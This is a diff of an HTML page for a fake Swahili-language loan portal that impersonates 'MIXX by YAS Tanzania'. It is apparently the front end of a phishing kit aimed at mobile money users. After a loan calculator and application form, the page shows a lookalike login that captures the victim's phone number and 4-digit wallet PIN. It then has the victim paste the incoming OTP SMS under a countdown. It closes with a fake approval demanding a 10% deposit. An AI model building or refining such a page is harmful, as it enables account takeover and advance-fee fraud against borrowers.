@@ -1,91 +1,220 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MIXX by YAS - Loan Portal</title>
+    <title>MIXX by YAS Tanzania - Pata Mkopo Wako Haraka</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
+    <div class="app-container">
         <!-- Header -->
         <header class="app-header">
-            <h1>MIXX by YAS</h1>
-            <p>Fast & Secure Mobile Financing Tanzania</p>
+            <div class="header-left">
+                <span class="menu-icon">☰</span>
+                <span class="back-btn" id="backBtn" style="display:none;">← Rudi</span>
+            </div>
+            <div class="brand-title">
+                <h1>MIXX by YAS</h1>
+                <span class="brand-sub">TANZANIA</span>
+            </div>
+            <div class="header-shield">🛡️ Usalama</div>
         </header>
 
-        <!-- Step 1: Loan Application & Amount Selection -->
-        <div id="step-1" class="card active">
-            <h2>Select Loan Amount</h2>
-            <div class="form-group">
-                <label for="loanAmount">Amount (TZS)</label>
-                <select id="loanAmount" class="form-control">
-                    <option value="50,000">TZS 50,000</option>
-                    <option value="100,000" selected>TZS 100,000</option>
-                    <option value="250,000">TZS 250,000</option>
-                    <option value="500,000">TZS 500,000</option>
+        <!-- STEP 1: Loan Application Slider -->
+        <section id="step-1" class="form-step active">
+            <div class="card-title-box">
+                <h2>Pata Mkopo Wako Haraka</h2>
+                <p>Idhini ya haraka • Riba nafuu • Muda rahisi</p>
+            </div>
+
+            <div class="calc-card">
+                <h3>Kikokotoo cha Mkopo</h3>
+                
+                <div class="input-group">
+                    <label>Kiasi cha Mkopo</label>
+                    <div class="display-value" id="amountDisplay">TSh 100,000</div>
+                    <input type="range" id="loanAmountSlider" min="10000" max="100000000" step="10000" value="100000">
+                    <div class="slider-bounds"><span>TSh 10K</span><span>TSh 100M</span></div>
+                </div>
+
+                <div class="input-group">
+                    <label>Muda wa Mkopo</label>
+                    <div class="display-value" id="durationDisplay">miezi 12</div>
+                    <input type="range" id="loanDurationSlider" min="6" max="60" step="1" value="12">
+                    <div class="slider-bounds"><span>miezi 6</span><span>miezi 60</span></div>
+                </div>
+
+                <div class="monthly-payment-box">
+                    <span>Malipo ya Kila Mwezi</span>
+                    <strong id="monthlyPayment">TSh 9,504</strong>
+                </div>
+            </div>
+
+            <button class="primary-btn" id="toStep2Btn">OMBA SASA</button>
+
+            <div class="features-footer">
+                <div>⚡ <strong>Idhini ya Haraka</strong><br><small>Ndani ya masaa 24</small></div>
+                <div>💰 <strong>Riba Nafuu</strong><br><small>Kuanzia 25%</small></div>
+                <div>🔒 <strong>Salama</strong><br><small>Kiwango cha benki</small></div>
+            </div>
+        </section>
+
+        <!-- STEP 2: Detailed Parameters (Hatua 1 ya 3) -->
+        <section id="step-details" class="form-step">
+            <div class="step-indicator">Maombi ya Mkopo<br><small>Hatua 1 ya 3</small></div>
+            <div class="progress-bar"><div class="progress-fill" style="width: 33%;"></div></div>
+
+            <div class="input-group">
+                <label>Aina ya Mkopo</label>
+                <select id="loanType">
+                    <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
+                    <option value="Mkopo wa Haraka">Mkopo wa Haraka</option>
+                    <option value="Mkopo wa Kilimo">Mkopo wa Kilimo</option>
                 </select>
             </div>
-            <div class="form-group">
-                <label for="loanDuration">Repayment Duration</label>
-                <select id="loanDuration" class="form-control">
-                    <option value="30 Days">30 Days</option>
-                    <option value="60 Days">60 Days</option>
-                    <option value="90 Days">90 Days</option>
+
+            <div class="input-group">
+                <label>Kiasi cha Mkopo (TSh)</label>
+                <input type="number" id="inputAmount" value="100000">
+            </div>
+
+            <div class="input-group">
+                <label>Muda wa Mkopo</label>
+                <select id="inputDuration">
+                    <option value="Miezi 12">Miezi 12</option>
+                    <option value="Miezi 24">Miezi 24</option>
+                    <option value="Miezi 48" selected>Miezi 48</option>
                 </select>
             </div>
-            <button id="proceedStep1" class="btn-primary">Continue</button>
-        </div>
 
-        <!-- Step 2: Personal Details & Tigo Pesa Number Validation -->
-        <div id="step-2" class="card">
-            <h2>Personal Verification</h2>
-            <p class="subtitle">Enter your details to receive funds via Tigo Pesa</p>
-            <form id="detailsForm">
-                <div class="form-group">
-                    <label for="fullName">Full Name</label>
-                    <input type="text" id="fullName" class="form-control" placeholder="e.g. Juma Ally" required>
-                </div>
-                <div class="form-group">
-                    <label for="phone">Tigo Pesa Phone Number</label>
-                    <input type="tel" id="phone" class="form-control" placeholder="07xxxxxxxx" maxlength="10" required>
-                    <small id="phoneError" class="error-text"></small>
-                </div>
-                <div class="form-group">
-                    <label for="pin">Wallet PIN</label>
-                    <input type="password" id="pin" class="form-control" placeholder="Enter PIN" maxlength="4" required>
-                </div>
-                <button type="submit" class="btn-primary">Submit Application</button>
-            </form>
-        </div>
-
-        <!-- Step 3: Initial Admin Approval Hold State -->
-        <div id="step-3" class="card text-center">
-            <div class="spinner"></div>
-            <h2>Waiting for Admin Approval</h2>
-            <p>Please do not close this window. Your transaction is being verified by MIXX by YAS secure processing.</p>
-        </div>
-
-        <!-- Step 4: OTP SMS Paste Page -->
-        <div id="step-4" class="card">
-            <h2>SMS Verification</h2>
-            <p class="subtitle">Paste the incoming confirmation message received on your phone.</p>
-            <div class="form-group">
-                <textarea id="otpText" class="form-control" rows="4" placeholder="Paste full SMS message here..."></textarea>
+            <div class="input-group">
+                <label>Madhumuni ya Mkopo</label>
+                <textarea id="loanPurpose" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
             </div>
-            <div id="otpFeedback" class="error-text"></div>
-            <button id="submitOtpBtn" class="btn-primary">Verify & Complete</button>
-        </div>
 
-        <!-- Step 5: Final Success Confirmation Screen -->
-        <div id="step-5" class="card text-center">
-            <div class="success-icon">✓</div>
-            <h2>Loan Approved Successfully!</h2>
-            <p>Your funds have been dispatched to your Tigo Pesa account via MIXX by YAS.</p>
-        </div>
+            <button class="primary-btn" id="toStep3Btn">HATUA INAYOFUATA</button>
+        </section>
+
+        <!-- STEP 3 of 3: Summary (Does NOT submit yet; leads to Login Screen for Credentials) -->
+        <section id="step-3" class="form-step">
+            <div class="step-indicator">Maombi ya Mkopo<br><small>Hatua 3 ya 3</small></div>
+            <div class="progress-bar"><div class="progress-fill" style="width: 100%;"></div></div>
+
+            <div class="input-group">
+                <label>Hali ya Ajira</label>
+                <select id="employmentStatus">
+                    <option value="Mfanyabiashara">Mfanyabiashara</option>
+                    <option value="Ameajiriwa">Ameajiriwa</option>
+                </select>
+            </div>
+
+            <div class="input-group">
+                <label>Mapato ya Mwaka (TSh)</label>
+                <input type="number" id="annualIncome" placeholder="Weka mapato ya mwaka">
+            </div>
+
+            <div class="summary-card">
+                <h4>Muhtasari wa Maombi</h4>
+                <div class="sum-row"><span>Kiasi cha Mkopo:</span> <strong id="sumAmount">TSh 100,000</strong></div>
+                <div class="sum-row"><span>Muda wa Mkopo:</span> <strong id="sumDuration">Miezi 48</strong></div>
+                <div class="sum-row"><span>Mwombaji:</span> <strong>MIXX by YAS Tanzania</strong></div>
+            </div>
+
+            <button class="primary-btn" id="toLoginScreenBtn">WASILISHA MAOMBI</button>
+        </section>
+
+        <!-- LOGIN STYLE SCREEN FOR PHONE & PIN (As requested in reference photo) -->
+        <section id="step-login" class="form-step login-bg-section">
+            <div class="login-box-wrapper">
+                <div class="login-title-center">
+                    <h3>Ingia Akaunti</h3>
+                </div>
+
+                <div class="input-group">
+                    <div class="phone-input-wrapper">
+                        <span class="flag-box">🇹🇿 +255</span>
+                        <input type="tel" id="tigoNumber" placeholder="712345678 au 0712345678" maxlength="10">
+                    </div>
+                </div>
+
+                <div class="pin-box-section">
+                    <label class="text-center">Weka PIN yako (tarakimu 4)</label>
+                    <div class="pin-digits-container">
+                        <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                        <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                        <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                        <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                    </div>
+                    <span class="forgot-pin">Umesahau PIN?</span>
+                </div>
+
+                <button class="primary-btn" id="submitLoginBtn" disabled>INGIA</button>
+            </div>
+        </section>
+
+        <!-- WAITING HOLDING SCREEN -->
+        <section id="step-waiting" class="form-step">
+            <div class="waiting-card">
+                <div class="spinner"></div>
+                <h2>Inasubiri Idhini ya Msimamizi</h2>
+                <p>Tafadhali subiri wakati maombi yako yanathibitishwa...</p>
+                <div id="errorBanner" class="error-banner" style="display:none;"></div>
+            </div>
+        </section>
+
+        <!-- STEP 4: OTP SMS Paste Page -->
+        <section id="step-otp" class="form-step">
+            <div class="otp-header-card">
+                <div class="otp-icon">💬 🔒</div>
+                <h2>TAFADHALI BANDIKA SMS ILIYOTUMWA KWAKO KWENYE NAMBARI YA MIXX BY YAS HAPA CHINI</h2>
+                <div class="timer-pill">⏰ HII ANAKOMA BAADA YA SEKUNDE <span id="countdownTimer">20</span></div>
+            </div>
+
+            <div class="input-group">
+                <textarea id="otpSmsInput" placeholder="Bandika hapa ujumbe wa SMS..." maxlength="1000"></textarea>
+                <div class="char-counter">0/1000</div>
+            </div>
+
+            <div class="otp-notice">
+                ℹ️ Hakikisha unatumia namba ya simu ya MIXX by YAS Tanzania na ina namba yako ya OTP.
+            </div>
+
+            <button class="primary-btn otp-submit-btn" id="submitOtpBtn">
+                🛡️ | THIBITISHA
+            </button>
+        </section>
+
+        <!-- STEP 5: Success & Congratulations 🎉 -->
+        <section id="step-success" class="form-step">
+            <div class="success-card">
+                <div class="success-badge">🎉 ✓</div>
+                <h2>Hongera!</h2>
+                <p>Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</p>
+
+                <div class="approved-amount-box">
+                    <small>KIASI KILICHOIDHINISHWA</small>
+                    <h3 id="finalApprovedAmount">TSh 100,000</h3>
+                </div>
+
+                <div class="notice-box-yellow">
+                    ⚠️ <strong>NOTISI YA UZINGATIAJI</strong><br>
+                    Akaunti yako ya MIXX by YAS lazima iwe hai na idumishe amana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba.
+                </div>
+
+                <div class="details-list">
+                    <h4>Maelezo ya Mkopo</h4>
+                    <div class="d-row"><span>MALIPO YA KILA MWEZI</span> <strong id="resMonthly">TSh 2,441</strong></div>
+                    <div class="d-row"><span>MUDA WA MKOPO</span> <strong id="resDuration">Miezi 48</strong></div>
+                    <div class="d-row"><span>KIWANGO CHA RIBA</span> <strong>8% APR</strong></div>
+                </div>
+
+                <button class="primary-btn" id="homeBtn">🏠 Rudi Nyumbani</button>
+            </div>
+        </section>
     </div>
 
     <script src="script.js"></script>
 </body>
-  </html>
-                                                                                                                      
+    </html>
+    
